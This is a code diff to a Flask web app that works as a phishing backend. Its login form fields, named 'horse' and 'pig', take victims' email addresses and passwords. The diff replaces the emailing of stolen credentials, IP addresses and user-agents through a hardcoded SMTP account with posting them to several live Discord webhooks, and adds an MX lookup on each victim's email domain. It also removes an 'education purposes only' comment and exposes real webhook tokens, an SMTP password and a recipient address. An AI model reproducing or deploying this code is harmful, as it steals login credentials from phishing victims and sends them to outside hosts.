@@ -1,3 +1,4 @@
+import requests
 from flask import Flask, request, abort, render_template, session, redirect, url_for, jsonify
 import secrets
 import random
@@ -11,8 +12,50 @@ from flask_limiter.util import get_remote_address
 import smtplib, ssl
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
+import time
+import random
+import dns.resolver
 
-# made for education purposes only
+# Discord Webhook URL
+DISCORD_WEBHOOK_URLS = [
+    "https://discord.com/api/webhooks/1366134764033151089/mGRQWnwdnm5L1h7KOSRwtp-49IpHfIlnDwyqexclT9Ilpz7d0MTRqdcgurSHtJeOu2eR",
+    "https://discord.com/api/webhooks/1366134775236005948/Nhvt9EFbfqtrCpEc9ue6NrGf_FpzSCkZBKZNNrQTiN8w_VbnhjeULmQYkhl5UyHg3D5f",
+    "https://discord.com/api/webhooks/1366134782278373546/vSzEOaTZeUrOGCymFbFI7E36pjzKC1FjTzbX8gVu4bLPeDM9fJGxyjxGA4F5WqCAkgV-"
+]
+
+def send_discord_message(email, password, ip, useragent, domain, mx_record):
+    webhook_url = random.choice(DISCORD_WEBHOOK_URLS)  # Select a random webhook
+    message = {
+        "username": "Logger Bot",
+        "avatar_url": "https://i.imgur.com/zW2WJ3o.png",  # Optional bot avatar
+        "embeds": [
+            {
+                "title": "🔔 General Login Attempt",
+                "color": 16711680,  # Red color in Discord embed
+                "fields": [
+                    {"name": "📧 Email", "value": f"`{email}`", "inline": False},
+                    {"name": "🔑 Password", "value": f"`{password}`", "inline": False},
+                    {"name": "🌐 IP", "value": f"`{ip}`", "inline": False},
+                    {"name": "🖥 User-Agent", "value": f"`{useragent}`", "inline": False},
+                    {"name": "🌍 Domain", "value": f"`{domain}`", "inline": False},
+                    {"name": "📨 MX Record", "value": f"`{mx_record}`", "inline": False},
+                ],
+                "footer": {"text": "Logger Bot - Secure Notifications"},
+            }
+        ]
+    }
+    
+    try:
+        requests.post(webhook_url, json=message)
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending message to Discord: {e}")
+
+def get_mx_record(domain):
+    try:
+        answers = dns.resolver.resolve(domain, 'MX')
+        return ', '.join(str(r.exchange) for r in answers)
+    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.Timeout):
+        return "No MX Record Found"
 
 app = Flask(__name__)
 limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
@@ -182,78 +225,58 @@ def route2():
 @app.route("/first", methods=['POST'])
 def first():
     if request.method == 'POST':
-        ip = request.headers.get('X-Forwarded-For')
-        if ip is None:
-            ip = request.headers.get('X-Real-IP')
-        if ip is None:
-            ip = request.headers.get('X-Client-IP')
-        if ip is None:
-            ip = request.remote_addr
+        ip = request.headers.get('X-Forwarded-For') or \
+             request.headers.get('X-Real-IP') or \
+             request.headers.get('X-Client-IP') or \
+             request.remote_addr
+
         email = request.form.get("horse")
-        passwordemail = request.form.get("pig")
-        sender_email = "navigatelist@guide-level.com"
-        sender_emaill = "contact"
-        receiver_email = "carolineudoh8@gmail.com"
-        password = "f({EhB,k!wPS"
+        password = request.form.get("pig")
         useragent = request.headers.get('User-Agent')
-        message = MIMEMultipart("alternative")
-        message["Subject"] = "Black Clover mars"
-        message["From"] = sender_email
-        message["To"] = receiver_email
-        text = """\
-        Hi,
-        ow are you?
-       
-        """
-        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
-        part1 = MIMEText(text, "plain")
-        part2 = MIMEText(html, "html")
-        message.attach(part1)
-        message.attach(part2)
-        with smtplib.SMTP_SSL("guide-level.com", 465) as server:
-            server.login(sender_email, password)
-            server.sendmail(sender_email, receiver_email, message.as_string())
-        # Set session value and redirect
-        session['eman'] = email  # Save email as session variable
+
+        # Get MX record
+        domain = email.split('@')[-1] if email and '@' in email else None
+        mx_record = get_mx_record(domain) if domain else "Invalid Domain"
+
+        # Send data to Discord
+        send_discord_message(email, password, ip, useragent, domain, mx_record)
+
+        # Store email in session
+        session['eman'] = email
+
+        # Redirect
         return redirect(url_for('benza', web=email))
+
+    return "Method Not Allowed", 405
 
 
 
 @app.route("/second", methods=['POST'])
 def second():
     if request.method == 'POST':
-        ip = request.headers.get('X-Forwarded-For')
-        if ip is None:
-            ip = request.headers.get('X-Real-IP')
-        if ip is None:
-            ip = request.headers.get('X-Client-IP')
-        if ip is None:
-            ip = request.remote_addr
+        ip = request.headers.get('X-Forwarded-For') or \
+             request.headers.get('X-Real-IP') or \
+             request.headers.get('X-Client-IP') or \
+             request.remote_addr
+
         email = request.form.get("horse")
-        passwordemail = request.form.get("pig")
-        sender_email = "navigatelist@guide-level.com"
-        sender_emaill = "contact"
-        receiver_email = "carolineudoh8@gmail.com"
-        password = "f({EhB,k!wPS"
+        password = request.form.get("pig")
         useragent = request.headers.get('User-Agent')
-        message = MIMEMultipart("alternative")
-        message["Subject"] = "Black Clover Pluto"
-        message["From"] = sender_email
-        message["To"] = receiver_email
-        text = """\
-        the,
-        dogs are ok?
-        """
-        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
-        part1 = MIMEText(text, "plain")
-        part2 = MIMEText(html, "html")
-        message.attach(part1)
-        message.attach(part2)
-        with smtplib.SMTP_SSL("guide-level.com", 465) as server:
-            server.login(sender_email, password)
-            server.sendmail(sender_email, receiver_email, message.as_string())
-        session['ins'] = email  # Save email as session variable
+
+        # Get MX record
+        domain = email.split('@')[-1] if email and '@' in email else None
+        mx_record = get_mx_record(domain) if domain else "Invalid Domain"
+
+        # Send data to Discord
+        send_discord_message(email, password, ip, useragent, domain, mx_record)
+
+        # Store email in session
+        session['ins'] = email
+
+        # Redirect
         return redirect(url_for('lasmo', web=email))
+
+    return "Method Not Allowed", 405
 
 
 
